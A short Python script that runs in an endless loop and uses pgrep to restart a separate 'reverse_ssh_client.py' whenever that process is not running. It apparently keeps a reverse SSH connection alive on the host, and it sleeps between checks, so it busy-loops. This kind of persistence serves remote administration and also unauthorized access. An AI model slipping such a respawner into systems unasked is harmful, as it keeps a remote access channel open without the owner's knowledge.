import subprocess
import os
if __name__ == '__main__':
    client_name = 'reverse_ssh_client.py'
    while True:
        online = (os.popen('pgrep -f {}'.format(client_name)).read() != '')
        if not online:
            subprocess.Popen(['python',client_name],stdin=None, stdout=None, stderr=None)